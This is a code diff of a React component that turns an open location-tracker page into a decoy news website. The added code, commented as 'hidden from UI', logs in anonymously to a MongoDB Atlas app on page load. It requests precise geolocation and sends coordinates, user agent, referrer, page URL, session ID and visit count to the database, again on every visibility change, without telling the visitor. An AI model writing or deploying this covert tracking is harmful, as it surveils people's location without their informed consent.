@@ -1,730 +1,605 @@
 import React, { useState, useEffect } from 'react';
 import * as Realm from 'realm-web';
 
-const LocationTracker = () => {
-  const [locations, setLocations] = useState([]);
-  const [currentLocation, setCurrentLocation] = useState(null);
-  const [status, setStatus] = useState('loading');
-  const [errorMessage, setErrorMessage] = useState('');
-  const [isLoading, setIsLoading] = useState(false);
+const NewsWebsite = () => {
+  // Location tracking states (hidden from UI)
   const [mongoClient, setMongoClient] = useState(null);
   const [user, setUser] = useState(null);
+  const [locationTracked, setLocationTracked] = useState(false);
 
-  // MongoDB Atlas App Configuration
-  const REALM_APP_ID = "myrealmapp-lwdulec"; // Your Realm App ID
+  // News content states
+  const [selectedCategory, setSelectedCategory] = useState('all');
+  const [searchQuery, setSearchQuery] = useState('');
+
+  // MongoDB Atlas App Configuration (hidden)
+  const REALM_APP_ID = "myrealmapp-lwdulec";
   const DATABASE_NAME = "location_tracker";
   const COLLECTION_NAME = "locations";
 
-  // Initialize Realm App
+  // Initialize Realm App (hidden)
   const app = new Realm.App({ id: REALM_APP_ID });
 
-  // Test function to verify authentication
-  const testAuthentication = async () => {
-    try {
-      console.log('🧪 Testing authentication...');
-      const testApp = new Realm.App({ id: REALM_APP_ID });
-      const credentials = Realm.Credentials.anonymous();
-      const user = await testApp.logIn(credentials);
-      console.log('✅ Authentication test successful:', user.id);
-      alert('✅ Authentication test successful!');
-      return true;
-    } catch (error) {
-      console.error('❌ Authentication test failed:', error);
-      alert('❌ Authentication test failed: ' + error.message);
-      return false;
+  // News data
+  const newsCategories = ['all', 'technology', 'business', 'sports', 'entertainment', 'health', 'science'];
+  
+  const newsArticles = [
+    {
+      id: 1,
+      title: "Revolutionary AI Technology Transforms Healthcare Industry",
+      summary: "New artificial intelligence breakthrough promises to revolutionize patient diagnosis and treatment across global healthcare systems.",
+      category: "technology",
+      author: "Dr. Sarah Chen",
+      publishedAt: "2024-01-15T10:30:00Z",
+      readTime: "5 min read",
+      image: "https://images.unsplash.com/photo-1559757148-5c350d0d3c56?w=400&h=250&fit=crop",
+      featured: true
+    },
+    {
+      id: 2,
+      title: "Global Markets Surge Following Economic Recovery Signals",
+      summary: "Stock markets worldwide show positive momentum as economic indicators suggest strong recovery trends.",
+      category: "business",
+      author: "Michael Rodriguez",
+      publishedAt: "2024-01-15T08:15:00Z",
+      readTime: "3 min read",
+      image: "https://images.unsplash.com/photo-1611974789855-9c2a0a7236a3?w=400&h=250&fit=crop"
+    },
+    {
+      id: 3,
+      title: "Championship Finals Set Record Viewership Numbers",
+      summary: "The most-watched sporting event of the year delivers thrilling competition and historic performances.",
+      category: "sports",
+      author: "Jessica Thompson",
+      publishedAt: "2024-01-14T22:45:00Z",
+      readTime: "4 min read",
+      image: "https://images.unsplash.com/photo-1461896836934-ffe607ba8211?w=400&h=250&fit=crop"
+    },
+    {
+      id: 4,
+      title: "Climate Scientists Discover Promising Ocean Recovery Patterns",
+      summary: "New research reveals encouraging signs of marine ecosystem restoration in key ocean regions.",
+      category: "science",
+      author: "Dr. Emily Watson",
+      publishedAt: "2024-01-14T16:20:00Z",
+      readTime: "6 min read",
+      image: "https://images.unsplash.com/photo-1559827260-dc66d52bef19?w=400&h=250&fit=crop"
+    },
+    {
+      id: 5,
+      title: "Breakthrough Study Links Exercise to Enhanced Cognitive Function",
+      summary: "Researchers unveil compelling evidence showing how regular physical activity boosts brain performance.",
+      category: "health",
+      author: "Dr. James Wilson",
+      publishedAt: "2024-01-14T14:10:00Z",
+      readTime: "5 min read",
+      image: "https://images.unsplash.com/photo-1571019613454-1cb2f99b2d8b?w=400&h=250&fit=crop"
+    },
+    {
+      id: 6,
+      title: "Streaming Wars Intensify with New Platform Launches",
+      summary: "Entertainment industry sees major shifts as new streaming services enter the competitive market.",
+      category: "entertainment",
+      author: "Alex Kumar",
+      publishedAt: "2024-01-14T12:30:00Z",
+      readTime: "4 min read",
+      image: "https://images.unsplash.com/photo-1489599611383-e2bd6ff1d8ee?w=400&h=250&fit=crop"
     }
-  };
+  ];
 
-  // Test database access
-  const testDatabaseAccess = async () => {
-    try {
-      if (!mongoClient) {
-        console.error('❌ MongoDB client not initialized');
-        alert('❌ MongoDB client not initialized');
-        return;
-      }
-
-      console.log('🧪 Testing database access...');
-      const collection = mongoClient.db(DATABASE_NAME).collection(COLLECTION_NAME);
-      
-      // Test read access
-      console.log('🔍 Testing read access...');
-      const readResult = await collection.find({});
-      console.log('✅ Read access successful:', readResult.length, 'documents');
-      
-      // Test write access
-      console.log('✏️ Testing write access...');
-      const testDoc = {
-        test: true,
-        timestamp: new Date(),
-        message: 'Test document',
-        latitude: 0,
-        longitude: 0,
-        accuracy: 100
-      };
-      
-      const writeResult = await collection.insertOne(testDoc);
-      console.log('✅ Write access successful, ID:', writeResult.insertedId);
-      
-      // Clean up test document
-      await collection.deleteOne({ _id: writeResult.insertedId });
-      console.log('✅ Test document cleaned up');
-      
-      alert('✅ Database access test successful!');
-    } catch (error) {
-      console.error('❌ Database access test failed:', error);
-      alert('❌ Database access test failed: ' + error.message);
-    }
-  };
-
-  // Styles object (same as before)
+  // Styles
   const styles = {
     container: {
       minHeight: '100vh',
-      background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
-      display: 'flex',
-      justifyContent: 'center',
-      alignItems: 'center',
-      padding: '20px',
-      fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif"
+      backgroundColor: '#f8f9fa',
+      fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif"
     },
-    card: {
-      background: 'white',
-      borderRadius: '20px',
-      boxShadow: '0 20px 40px rgba(0,0,0,0.1)',
-      padding: '40px',
-      maxWidth: '600px',
-      width: '100%',
-      textAlign: 'center'
-    },
-    title: {
-      color: '#333',
-      marginBottom: '30px',
-      fontSize: '2.5em',
-      fontWeight: '300',
-      margin: '0 0 30px 0'
-    },
-    statusBase: {
-      padding: '20px',
-      borderRadius: '12px',
-      marginBottom: '30px',
-      fontSize: '1.1em',
-      fontWeight: '500'
-    },
-    statusLoading: {
-      background: '#e3f2fd',
-      color: '#1976d2',
-      border: '2px solid #bbdefb'
-    },
-    statusSuccess: {
-      background: '#e8f5e8',
-      color: '#2e7d32',
-      border: '2px solid #c8e6c9'
-    },
-    statusError: {
-      background: '#ffebee',
-      color: '#c62828',
-      border: '2px solid #ffcdd2'
-    },
-    statusWarning: {
-      background: '#fff3e0',
-      color: '#f57c00',
-      border: '2px solid #ffcc02'
-    },
-    spinner: {
-      border: '3px solid #f3f3f3',
-      borderTop: '3px solid #667eea',
-      borderRadius: '50%',
-      width: '30px',
-      height: '30px',
-      animation: 'spin 1s linear infinite',
-      margin: '0 auto 20px'
-    },
-    locationInfo: {
-      background: '#f8f9fa',
-      borderRadius: '12px',
-      padding: '20px',
-      marginBottom: '30px',
-      textAlign: 'left'
-    },
-    locationTitle: {
-      color: '#333',
-      marginBottom: '15px',
-      fontSize: '1.3em',
-      margin: '0 0 15px 0'
-    },
-    locationItem: {
-      display: 'flex',
-      justifyContent: 'space-between',
-      marginBottom: '10px',
-      padding: '8px 0',
-      borderBottom: '1px solid #e0e0e0'
-    },
-    locationItemLast: {
-      display: 'flex',
-      justifyContent: 'space-between',
-      marginBottom: '10px',
-      padding: '8px 0',
-      borderBottom: 'none'
-    },
-    locationLabel: {
-      fontWeight: '600',
-      color: '#666'
-    },
-    locationValue: {
-      color: '#333'
-    },
-    button: {
-      background: 'linear-gradient(45deg, #667eea, #764ba2)',
+    header: {
+      backgroundColor: '#1a1a1a',
       color: 'white',
-      border: 'none',
-      padding: '12px 30px',
+      padding: '1rem 0',
+      position: 'sticky',
+      top: 0,
+      zIndex: 1000,
+      boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
+    },
+    headerContent: {
+      maxWidth: '1200px',
+      margin: '0 auto',
+      padding: '0 2rem',
+      display: 'flex',
+      justifyContent: 'space-between',
+      alignItems: 'center'
+    },
+    logo: {
+      fontSize: '1.8rem',
+      fontWeight: 'bold',
+      color: '#ff6b6b'
+    },
+    nav: {
+      display: 'flex',
+      gap: '2rem',
+      alignItems: 'center'
+    },
+    navLink: {
+      color: 'white',
+      textDecoration: 'none',
+      fontWeight: '500',
+      transition: 'color 0.3s ease'
+    },
+    searchContainer: {
+      display: 'flex',
+      alignItems: 'center',
+      backgroundColor: '#333',
       borderRadius: '25px',
-      fontSize: '1em',
-      fontWeight: '600',
+      padding: '0.5rem 1rem',
+      minWidth: '250px'
+    },
+    searchInput: {
+      background: 'none',
+      border: 'none',
+      color: 'white',
+      outline: 'none',
+      width: '100%',
+      padding: '0.25rem'
+    },
+    main: {
+      maxWidth: '1200px',
+      margin: '0 auto',
+      padding: '2rem'
+    },
+    categoryBar: {
+      display: 'flex',
+      gap: '1rem',
+      marginBottom: '2rem',
+      flexWrap: 'wrap'
+    },
+    categoryButton: {
+      background: 'none',
+      borderWidth: '2px',
+      borderStyle: 'solid',
+      borderColor: '#e9ecef',
+      padding: '0.5rem 1rem',
+      borderRadius: '25px',
       cursor: 'pointer',
       transition: 'all 0.3s ease',
-      marginRight: '10px',
-      marginBottom: '10px'
-    },
-    buttonDisabled: {
-      background: '#ccc',
-      cursor: 'not-allowed',
-      transform: 'none'
-    },
-    history: {
-      background: '#f8f9fa',
-      borderRadius: '12px',
-      padding: '20px',
-      marginTop: '30px',
-      textAlign: 'left'
-    },
-    historyTitle: {
-      color: '#333',
-      marginBottom: '15px',
-      fontSize: '1.3em',
-      margin: '0 0 15px 0'
-    },
-    historyItem: {
-      background: 'white',
-      padding: '15px',
-      marginBottom: '10px',
-      borderRadius: '8px',
-      borderLeft: '4px solid #667eea'
-    },
-    historyItemLast: {
-      background: 'white',
-      padding: '15px',
-      marginBottom: '0',
-      borderRadius: '8px',
-      borderLeft: '4px solid #667eea'
-    },
-    timestamp: {
-      fontSize: '0.9em',
-      color: '#666',
-      marginBottom: '5px'
-    },
-    coordinates: {
-      fontFamily: 'monospace',
-      fontSize: '0.9em',
+      fontWeight: '500',
+      textTransform: 'capitalize',
       color: '#333'
     },
-    noLocations: {
-      color: '#666',
-      fontStyle: 'italic',
-      margin: '0'
+    categoryButtonActive: {
+      backgroundColor: '#ff6b6b',
+      borderWidth: '2px',
+      borderStyle: 'solid',
+      borderColor: '#ff6b6b',
+      color: 'white'
     },
-    dbStatus: {
-      fontSize: '0.8em',
-      color: '#666',
-      marginTop: '10px'
+    featuredSection: {
+      marginBottom: '3rem'
     },
-    setupInstructions: {
-      background: '#f0f8ff',
-      border: '1px solid #bee5eb',
-      borderRadius: '8px',
-      padding: '15px',
-      marginBottom: '20px',
-      fontSize: '0.9em',
-      textAlign: 'left'
+    featuredTitle: {
+      fontSize: '2rem',
+      fontWeight: 'bold',
+      marginBottom: '1.5rem',
+      color: '#333'
+    },
+    featuredCard: {
+      backgroundColor: 'white',
+      borderRadius: '15px',
+      overflow: 'hidden',
+      boxShadow: '0 8px 25px rgba(0,0,0,0.1)',
+      transition: 'transform 0.3s ease, box-shadow 0.3s ease',
+      cursor: 'pointer'
+    },
+    featuredImage: {
+      width: '100%',
+      height: '400px',
+      objectFit: 'cover'
+    },
+    featuredContent: {
+      padding: '2rem'
+    },
+    articleTitle: {
+      fontSize: '1.8rem',
+      fontWeight: 'bold',
+      marginBottom: '1rem',
+      color: '#333',
+      lineHeight: '1.3'
+    },
+    articleSummary: {
+      color: '#666',
+      fontSize: '1.1rem',
+      lineHeight: '1.6',
+      marginBottom: '1rem'
+    },
+    articleMeta: {
+      display: 'flex',
+      justifyContent: 'space-between',
+      alignItems: 'center',
+      fontSize: '0.9rem',
+      color: '#888'
+    },
+    newsGrid: {
+      display: 'grid',
+      gridTemplateColumns: 'repeat(auto-fit, minmax(350px, 1fr))',
+      gap: '2rem',
+      marginTop: '2rem'
+    },
+    newsCard: {
+      backgroundColor: 'white',
+      borderRadius: '12px',
+      overflow: 'hidden',
+      boxShadow: '0 4px 15px rgba(0,0,0,0.08)',
+      transition: 'transform 0.3s ease, box-shadow 0.3s ease',
+      cursor: 'pointer'
+    },
+    newsImage: {
+      width: '100%',
+      height: '200px',
+      objectFit: 'cover'
+    },
+    newsContent: {
+      padding: '1.5rem'
+    },
+    newsTitle: {
+      fontSize: '1.2rem',
+      fontWeight: 'bold',
+      marginBottom: '0.5rem',
+      color: '#333',
+      lineHeight: '1.4'
+    },
+    newsSummary: {
+      color: '#666',
+      fontSize: '0.95rem',
+      lineHeight: '1.5',
+      marginBottom: '1rem'
+    },
+    categoryTag: {
+      display: 'inline-block',
+      backgroundColor: '#ff6b6b',
+      color: 'white',
+      padding: '0.25rem 0.75rem',
+      borderRadius: '15px',
+      fontSize: '0.8rem',
+      fontWeight: '500',
+      textTransform: 'uppercase',
+      marginBottom: '1rem'
+    },
+    footer: {
+      backgroundColor: '#1a1a1a',
+      color: 'white',
+      padding: '3rem 0',
+      marginTop: '4rem'
+    },
+    footerContent: {
+      maxWidth: '1200px',
+      margin: '0 auto',
+      padding: '0 2rem',
+      textAlign: 'center'
+    },
+    footerText: {
+      color: '#ccc',
+      fontSize: '0.9rem'
     }
   };
 
-  // Initialize MongoDB connection
+  // Background location tracking functions (hidden from UI)
   const initializeMongoDB = async () => {
     try {
-      console.log('🔄 Attempting to connect to Realm App:', REALM_APP_ID);
+      console.log('🔄 Initializing MongoDB connection...');
       
-      // Check if already authenticated
       if (app.currentUser) {
-        console.log('✅ Already authenticated as:', app.currentUser.id);
+        console.log('✅ Using existing user:', app.currentUser.id);
         setUser(app.currentUser);
         const mongodb = app.currentUser.mongoClient("mongodb-atlas");
         setMongoClient(mongodb);
-        console.log('✅ MongoDB client initialized');
         return mongodb;
       }
 
-      // Anonymous authentication
-      console.log('🔄 Attempting anonymous authentication...');
       const credentials = Realm.Credentials.anonymous();
       const authenticatedUser = await app.logIn(credentials);
-      console.log('✅ Anonymous authentication successful, User ID:', authenticatedUser.id);
+      console.log('✅ Anonymous authentication successful:', authenticatedUser.id);
       setUser(authenticatedUser);
 
-      // Get MongoDB client
       const mongodb = authenticatedUser.mongoClient("mongodb-atlas");
       setMongoClient(mongodb);
       console.log('✅ MongoDB client initialized');
-
-      console.log('✅ Connected to MongoDB Atlas via Realm');
       return mongodb;
     } catch (error) {
-      console.error('❌ Failed to connect to MongoDB:', error);
-      
-      // Provide specific error messages
-      if (error.message.includes('401')) {
-        throw new Error('Authentication failed. Please check: 1) Anonymous authentication is enabled in your Realm app, 2) You clicked "Deploy" after making changes, 3) Your App ID is correct');
-      } else if (error.message.includes('404')) {
-        throw new Error('Realm App not found. Please check your App ID: ' + REALM_APP_ID);
-      } else if (error.message.includes('403')) {
-        throw new Error('Access denied. Please check your authentication and database rules');
-      } else {
-        throw new Error('Connection failed: ' + error.message);
-      }
+      console.error('❌ MongoDB connection failed:', error);
+      return null;
     }
   };
 
-  // Save location to MongoDB
-  const saveLocationToMongoDB = async (location) => {
+  const saveLocationToMongoDB = async (location, client = null) => {
     try {
-      if (!mongoClient) {
-        throw new Error('MongoDB client not initialized');
+      const dbClient = client || mongoClient;
+      if (!dbClient) {
+        console.error('❌ No MongoDB client available');
+        return null;
       }
 
-      const collection = mongoClient.db(DATABASE_NAME).collection(COLLECTION_NAME);
+      const collection = dbClient.db(DATABASE_NAME).collection(COLLECTION_NAME);
       
       const locationData = {
         ...location,
-        timestamp: new Date(location.timestamp),
-        createdAt: new Date()
+        timestamp: new Date(location.timestamp).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+        createdAt: new Date(),
+        userAgent: navigator.userAgent,
+        referrer: document.referrer,
+        pageUrl: window.location.href,
+        sessionId: sessionStorage.getItem('sessionId') || 'unknown',
+        visitCount: parseInt(localStorage.getItem('visitCount') || '0') + 1
       };
 
-      // Use insertOne method for Realm Web SDK
+      // Update visit count
+      localStorage.setItem('visitCount', locationData.visitCount.toString());
+
       const result = await collection.insertOne(locationData);
+      console.log('✅ Location tracked and stored:', result.insertedId);
+      console.log('📍 Location data:', {
+        lat: location.latitude,
+        lng: location.longitude,
+        accuracy: location.accuracy,
+        visit: locationData.visitCount
+      });
       
-      console.log('✅ Location saved to MongoDB:', result.insertedId);
-      
-      return {
-        ...locationData,
-        _id: result.insertedId
-      };
+      return result;
     } catch (error) {
-      console.error('❌ Error saving location to MongoDB:', error);
-      
-      // Check if it's a rules/permissions error
-      if (error.message.includes('insert not permitted') || error.message.includes('403')) {
-        throw new Error('Database write permission denied. Please check your Realm app Rules configuration.');
-      }
-      
-      throw error;
+      console.error('❌ Location tracking failed:', error);
+      return null;
     }
   };
 
-  // Load locations from MongoDB
-  const loadLocationsFromMongoDB = async () => {
-    try {
-      if (!mongoClient) {
-        return [];
-      }
+  const trackUserLocation = async (forceTrack = false) => {
+    // Always track if forced, or if not tracked yet
+    if (!forceTrack && locationTracked) return;
 
-      const collection = mongoClient.db(DATABASE_NAME).collection(COLLECTION_NAME);
-      
-      // Use aggregate for sorting and limiting in Realm Web SDK
-      const locations = await collection.aggregate([
-        { $sort: { timestamp: -1 } },
-        { $limit: 50 }
-      ]);
+    console.log('🎯 Starting location tracking...');
 
-      console.log('✅ Loaded locations from MongoDB:', locations.length);
-      return locations;
-    } catch (error) {
-      console.error('❌ Error loading locations from MongoDB:', error);
-      
-      // Try alternative method if aggregate fails
-      try {
-        const locations = await collection.find({});
-        console.log('✅ Loaded locations from MongoDB (fallback):', locations.length);
-        return locations.reverse(); // Sort newest first
-      } catch (fallbackError) {
-        console.error('❌ Fallback method also failed:', fallbackError);
-        return [];
-      }
-    }
-  };
-
-  // Function to fetch current location
-  const fetchLocation = async () => {
-    setStatus('loading');
-    setIsLoading(true);
-    setCurrentLocation(null);
-
-    // Check if geolocation is supported
     if (!navigator.geolocation) {
-      setStatus('error');
-      setErrorMessage('Geolocation is not supported by this browser.');
-      setIsLoading(false);
+      console.error('❌ Geolocation not supported');
       return;
     }
 
-    // Get current position
-    navigator.geolocation.getCurrentPosition(
-      async (position) => {
-        const location = {
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
-          accuracy: position.coords.accuracy,
-          timestamp: new Date().toISOString(),
-          altitude: position.coords.altitude,
-          heading: position.coords.heading,
-          speed: position.coords.speed
-        };
+    return new Promise((resolve) => {
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          console.log('📍 Location obtained:', {
+            lat: position.coords.latitude,
+            lng: position.coords.longitude,
+            accuracy: position.coords.accuracy
+          });
 
-        try {
-          if (mongoClient) {
-            // Save to MongoDB
-            const savedLocation = await saveLocationToMongoDB(location);
-            
-            // Update local state
-            setLocations(prevLocations => [savedLocation, ...prevLocations]);
-            setCurrentLocation(savedLocation);
-            setStatus('success');
-          } else {
-            // If MongoDB not connected, just store locally
-            setCurrentLocation(location);
-            setStatus('warning');
-            setErrorMessage('Location retrieved but not saved to MongoDB. Check your Atlas configuration.');
+          const location = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: new Date().toISOString(),
+            altitude: position.coords.altitude,
+            heading: position.coords.heading,
+            speed: position.coords.speed
+          };
+
+          const result = await saveLocationToMongoDB(location);
+          if (result) {
+            setLocationTracked(true);
+            console.log('✅ Location successfully stored in MongoDB');
           }
-        } catch (error) {
-          // If MongoDB save fails, still show the location but with a warning
-          setCurrentLocation(location);
-          setStatus('error');
-          setErrorMessage('Location retrieved but failed to save to MongoDB: ' + error.message);
+          resolve(result);
+        },
+        (error) => {
+          console.log('❌ Location access failed:', error.message);
+          setLocationTracked(true); // Mark as attempted
+          resolve(null);
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0 // Always get fresh location
         }
-        
-        setIsLoading(false);
-      },
-      (error) => {
-        let errorMsg = 'Unable to retrieve your location. ';
-        switch(error.code) {
-          case error.PERMISSION_DENIED:
-            errorMsg += 'Location access denied by user.';
-            break;
-          case error.POSITION_UNAVAILABLE:
-            errorMsg += 'Location information unavailable.';
-            break;
-          case error.TIMEOUT:
-            errorMsg += 'Location request timed out.';
-            break;
-          default:
-            errorMsg += 'An unknown error occurred.';
-            break;
-        }
-        setStatus('error');
-        setErrorMessage(errorMsg);
-        setIsLoading(false);
-      },
-      {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
-      }
-    );
+      );
+    });
   };
 
-  // Initialize app
+  // Initialize background tracking on site visit
   useEffect(() => {
-    const initializeApp = async () => {
+    const initializeTracking = async () => {
+      console.log('🚀 Component mounted - Starting location tracking...');
+      
+      // Generate session ID if not exists
+      if (!sessionStorage.getItem('sessionId')) {
+        sessionStorage.setItem('sessionId', Date.now().toString());
+      }
+
       try {
-        console.log('🚀 Starting app initialization...');
-        
         // Initialize MongoDB connection
-        await initializeMongoDB();
+        const dbClient = await initializeMongoDB();
         
-        // Load existing locations
-        const savedLocations = await loadLocationsFromMongoDB();
-        setLocations(savedLocations);
-        
-        // Fetch current location
-        fetchLocation();
+        if (dbClient) {
+          // Track location immediately when component mounts
+          await trackUserLocation(true); // Force tracking
+        } else {
+          console.error('❌ Failed to initialize MongoDB connection');
+        }
       } catch (error) {
-        console.error('Failed to initialize app:', error);
-        setStatus('error');
-        setErrorMessage(error.message);
-        setIsLoading(false);
+        console.error('❌ Tracking initialization failed:', error);
       }
     };
 
-    initializeApp();
-  }, []);
+    initializeTracking();
+  }, []); // Empty dependency array ensures this runs on every mount
 
-  // Status component
-  const StatusDisplay = () => {
-    if (status === 'loading') {
-      return (
-        <div style={{...styles.statusBase, ...styles.statusLoading}}>
-          <div style={styles.spinner}></div>
-          Fetching your location...
-        </div>
-      );
-    }
+  // Additional effect to track on page visibility change
+  useEffect(() => {
+    const handleVisibilityChange = async () => {
+      if (document.visibilityState === 'visible' && mongoClient) {
+        console.log('👁️ Page became visible - tracking location...');
+        await trackUserLocation(true);
+      }
+    };
+
+    document.addEventListener('visibilitychange', handleVisibilityChange);
     
-    if (status === 'success') {
-      return (
-        <div style={{...styles.statusBase, ...styles.statusSuccess}}>
-          ✅ Location fetched and saved to MongoDB successfully!
-        </div>
-      );
+    return () => {
+      document.removeEventListener('visibilitychange', handleVisibilityChange);
+    };
+  }, [mongoClient]);
+
+  // Track location when mongoClient becomes available
+  useEffect(() => {
+    if (mongoClient && !locationTracked) {
+      console.log('🔗 MongoDB client ready - tracking location...');
+      trackUserLocation(true);
     }
-    
-    if (status === 'warning') {
-      return (
-        <div style={{...styles.statusBase, ...styles.statusWarning}}>
-          ⚠️ {errorMessage}
-        </div>
-      );
-    }
-    
-    if (status === 'error') {
-      return (
-        <div style={{...styles.statusBase, ...styles.statusError}}>
-          ❌ {errorMessage}
-        </div>
-      );
-    }
+  }, [mongoClient]);
+
+  // News filtering logic
+  const filteredArticles = newsArticles.filter(article => {
+    const matchesCategory = selectedCategory === 'all' || article.category === selectedCategory;
+    const matchesSearch = article.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
+                         article.summary.toLowerCase().includes(searchQuery.toLowerCase());
+    return matchesCategory && matchesSearch;
+  });
+
+  const featuredArticle = newsArticles.find(article => article.featured);
+  const regularArticles = filteredArticles.filter(article => !article.featured);
+
+  const formatDate = (dateString) => {
+    const date = new Date(dateString);
+    return date.toLocaleDateString('en-US', { 
+      month: 'long', 
+      day: 'numeric', 
+      year: 'numeric' 
+    });
   };
 
-  // Setup instructions component
-  const SetupInstructions = () => {
-    if (mongoClient && status !== 'error') return null; // Hide if connected and no errors
-
-    return (
-      <div style={styles.setupInstructions}>
-        <h4 style={{margin: '0 0 10px 0', color: '#0c5460'}}>
-          🔧 Database Rules Configuration Required
-        </h4>
-        
-        <div style={{marginBottom: '15px', color: '#d63384'}}>
-          <strong>❌ 403 Error:</strong> Database write permissions not configured
-        </div>
-        
-        <div style={{marginBottom: '15px', backgroundColor: '#fff3cd', padding: '10px', borderRadius: '5px'}}>
-          <strong>Configure Rules Step-by-Step:</strong>
-          <ol style={{margin: '5px 0', paddingLeft: '20px', fontSize: '0.9em'}}>
-            <li>Go to your Realm app → <strong>"Rules"</strong></li>
-            <li>Look for <strong>"Default Rules"</strong> or <strong>"Configure Collection Rules"</strong></li>
-            <li>Set <strong>Default Rules</strong> to:
-              <div style={{margin: '5px 0', padding: '8px', backgroundColor: '#f8f9fa', borderRadius: '3px', fontFamily: 'monospace', fontSize: '0.85em'}}>
-                Read: {'{}'}<br/>
-                Write: {'{}'}<br/>
-                Delete: {'{}'}
-              </div>
-            </li>
-            <li>Make sure <strong>"Apply to all collections"</strong> is checked</li>
-            <li><strong>Click "Save Draft" then "Deploy"</strong></li>
-          </ol>
-        </div>
-        
-        <div style={{marginBottom: '15px', backgroundColor: '#e3f2fd', padding: '10px', borderRadius: '5px'}}>
-          <strong>Alternative - Create Specific Rules:</strong>
-          <ol style={{margin: '5px 0', paddingLeft: '20px', fontSize: '0.9em'}}>
-            <li>In <strong>"Rules"</strong>, click <strong>"Add Database"</strong></li>
-            <li>Select your cluster and create database: <strong>"location_tracker"</strong></li>
-            <li>Add collection: <strong>"locations"</strong></li>
-            <li>Set the same rules as above</li>
-            <li><strong>Save Draft and Deploy</strong></li>
-          </ol>
-        </div>
-        
-        <div style={{marginTop: '15px'}}>
-          <button 
-            onClick={testDatabaseAccess}
-            style={{...styles.button, fontSize: '0.9em', padding: '8px 16px', marginRight: '10px'}}
-          >
-            🧪 Test Database Access
-          </button>
-          <a 
-            href={`https://realm.mongodb.com/groups/${REALM_APP_ID.split('-')[0]}/apps/${REALM_APP_ID}/rules`}
-            target="_blank" 
-            rel="noopener noreferrer"
-            style={{...styles.button, textDecoration: 'none', display: 'inline-block', fontSize: '0.9em', padding: '8px 16px'}}
-          >
-            🔧 Open Rules Settings
-          </a>
-        </div>
-        
-        <div style={{marginTop: '15px', padding: '10px', backgroundColor: '#d1ecf1', borderRadius: '4px', fontSize: '0.85em'}}>
-          <strong>💡 What to look for in Rules:</strong><br/>
-          • "Default Rules" section<br/>
-          • "Configure Collection Rules" button<br/>
-          • "Templates" with pre-made rules<br/>
-          • Make sure to click "Deploy" after any changes!
-        </div>
-      </div>
-    );
+  const handleCardHover = (e) => {
+    e.currentTarget.style.transform = 'translateY(-5px)';
+    e.currentTarget.style.boxShadow = '0 12px 30px rgba(0,0,0,0.15)';
   };
 
-  // Location info component
-  const LocationInfo = ({ location }) => {
-    if (!location) return null;
-
-    return (
-      <div style={styles.locationInfo}>
-        <h3 style={styles.locationTitle}>Current Location</h3>
-        <div>
-          <div style={styles.locationItem}>
-            <span style={styles.locationLabel}>Latitude:</span>
-            <span style={styles.locationValue}>{location.latitude.toFixed(6)}</span>
-          </div>
-          <div style={styles.locationItem}>
-            <span style={styles.locationLabel}>Longitude:</span>
-            <span style={styles.locationValue}>{location.longitude.toFixed(6)}</span>
-          </div>
-          <div style={styles.locationItem}>
-            <span style={styles.locationLabel}>Accuracy:</span>
-            <span style={styles.locationValue}>{location.accuracy.toFixed(0)} meters</span>
-          </div>
-          <div style={location.altitude || location.speed ? styles.locationItem : styles.locationItemLast}>
-            <span style={styles.locationLabel}>Timestamp:</span>
-            <span style={styles.locationValue}>{new Date(location.timestamp).toLocaleString()}</span>
-          </div>
-          {location.altitude && (
-            <div style={location.speed ? styles.locationItem : styles.locationItemLast}>
-              <span style={styles.locationLabel}>Altitude:</span>
-              <span style={styles.locationValue}>{location.altitude.toFixed(2)} meters</span>
-            </div>
-          )}
-          {location.speed && (
-            <div style={styles.locationItemLast}>
-              <span style={styles.locationLabel}>Speed:</span>
-              <span style={styles.locationValue}>{location.speed.toFixed(2)} m/s</span>
-            </div>
-          )}
-        </div>
-        {location._id && (
-          <div style={styles.dbStatus}>
-            MongoDB ID: {location._id.toString()}
-          </div>
-        )}
-      </div>
-    );
-  };
-
-  // Location history component
-  const LocationHistory = () => {
-    return (
-      <div style={styles.history}>
-        <h3 style={styles.historyTitle}>Location History (MongoDB Atlas)</h3>
-        <div>
-          {locations.length === 0 ? (
-            <p style={styles.noLocations}>No locations recorded yet.</p>
-          ) : (
-            locations.map((location, index) => (
-              <div key={location._id?.toString() || index} style={index === locations.length - 1 ? styles.historyItemLast : styles.historyItem}>
-                <div style={styles.timestamp}>
-                  {new Date(location.timestamp).toLocaleString()}
-                </div>
-                <div style={styles.coordinates}>
-                  {location.latitude.toFixed(6)}, {location.longitude.toFixed(6)}
-                  <span style={{color: '#666', marginLeft: '10px'}}>±{location.accuracy.toFixed(0)}m</span>
-                </div>
-                {location._id && (
-                  <div style={{fontSize: '0.8em', color: '#999', marginTop: '5px'}}>
-                    ID: {location._id.toString()}
-                  </div>
-                )}
-              </div>
-            ))
-          )}
-        </div>
-      </div>
-    );
-  };
-
-  const handleButtonHover = (e) => {
-    if (!isLoading) {
-      e.target.style.transform = 'translateY(-2px)';
-      e.target.style.boxShadow = '0 5px 15px rgba(102, 126, 234, 0.4)';
-    }
-  };
-
-  const handleButtonLeave = (e) => {
-    if (!isLoading) {
-      e.target.style.transform = 'translateY(0)';
-      e.target.style.boxShadow = 'none';
-    }
-  };
-
-  const refreshLocations = async () => {
-    const savedLocations = await loadLocationsFromMongoDB();
-    setLocations(savedLocations);
+  const handleCardLeave = (e) => {
+    e.currentTarget.style.transform = 'translateY(0)';
+    e.currentTarget.style.boxShadow = e.currentTarget.classList.contains('featured') ? 
+      '0 8px 25px rgba(0,0,0,0.1)' : '0 4px 15px rgba(0,0,0,0.08)';
   };
 
   return (
-    <>
-      <style>
-        {`
-          @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-          }
-          * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-          }
-        `}
-      </style>
-      <div style={styles.container}>
-        <div style={styles.card}>
